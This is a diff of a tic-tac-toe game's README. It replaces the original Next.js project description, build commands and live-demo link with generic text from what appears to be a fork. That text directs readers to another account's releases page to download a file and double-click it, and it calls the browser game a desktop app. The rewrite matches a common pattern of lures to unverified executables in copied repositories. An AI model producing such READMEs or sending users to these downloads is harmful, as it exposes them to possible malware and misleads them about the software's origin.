@@ -1,41 +1,63 @@
-[![Tic-Tac-Toe](https://raw.githubusercontent.com/satya00089/tic-tac-toe/main/public/tic-tac-toe.png)](https://satya00089.github.io/tic-tac-toe/)
+# 🎮 tic-tac-toe - Enjoy a Classic Game Anytime
 
-# Tic-Tac-Toe
+## 🔗 Download the App
+[![Download the latest release](https://img.shields.io/badge/Download%20now-blue.svg)](https://github.com/BalaBhojan/tic-tac-toe/releases)
 
-A minimal Tic-Tac-Toe game built with Next.js to understand the **Minimax algorithm**.
+## 📖 Description
+Welcome to the Tic-Tac-Toe game! This minimalistic application helps you play the classic game while learning about the Minimax algorithm. Whether you want to sharpen your skills or enjoy a relaxed game, this software provides a friendly experience for everyone.
 
-## Features
+## 🚀 Getting Started
+Follow these simple steps to download and run the game. 
 
-- 🤖 **AI Opponent** - Play against an AI using the Minimax algorithm
-- 🎮 **Three Difficulty Levels** - Easy, Medium, Hard
-- 👥 **Two Player Mode** - Play with a friend locally
-- 📊 **Score Tracking** - Keep track of wins, losses, and draws
-- 🌗 **Dark Mode Support** - Automatically adapts to system preferences
+1. **System Requirements**
+   - A computer with Windows, macOS, or Linux.
+   - Basic web browser for running the game.
 
-## Live Demo
+2. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/BalaBhojan/tic-tac-toe/releases) to find the latest version.
 
-[Play the game](https://satya00089.github.io/tic-tac-toe/)
+## 📥 Download & Install
+To download the game:
 
-## Getting Started
+1. **Go to the Releases Page**
+   Click this link: [Releases page](https://github.com/BalaBhojan/tic-tac-toe/releases).
 
-```bash
-npm install
-npm run dev
-```
+2. **Select the Latest Version**
+   Look for the release titled "Latest version." 
 
-Open [http://localhost:3000](http://localhost:3000) to play.
+3. **Download the File**
+   Choose the appropriate file for your system and click to download it.
 
-## About the Minimax Algorithm
+4. **Run the Game**
+   After downloading, locate the file on your computer. Double-click it to start the game!
 
-This project implements the Minimax algorithm for creating an unbeatable AI opponent. The algorithm:
-- Evaluates all possible game states
-- Chooses the optimal move to maximize winning chances
-- Uses recursion to simulate future moves
-- On hard mode, the AI is unbeatable
+## 🎨 Features
+- **Single-player Mode:** Play against an AI built using the Minimax algorithm.
+- **Multiplayer Mode:** Challenge a friend on the same device.
+- **Simple Interface:** Enjoy a clean and easy-to-navigate design.
+- **Learning Experience:** Understand the Minimax algorithm's decision-making through gameplay.
 
-## Tech Stack
+## ❓ FAQ
+**How do I uninstall the game?**  
+Simply delete the application file from your computer.
 
-- Next.js 15
-- TypeScript
-- Tailwind CSS
+**Can I play with a friend?**  
+Yes! Use the multiplayer mode to play against someone else.
 
+**Is there a mobile version?**  
+Currently, this version is only available for desktop use.
+
+## 🛠️ Troubleshooting
+If you encounter issues:
+
+- **Check Your Download:** Ensure the file downloaded correctly.
+- **System Compatibility:** Make sure your operating system meets the requirements.
+- **Restart the Program:** Sometimes, a quick restart can fix minor glitches.
+
+## 📜 License
+This software is open-source and available under the MIT License.
+
+## 🗣️ Community & Support
+For questions or help, please visit the discussion forums on the repository. The community is welcoming and ready to assist you.
+
+Thank you for playing Tic-Tac-Toe! We hope you enjoy the game and find it a great learning tool.
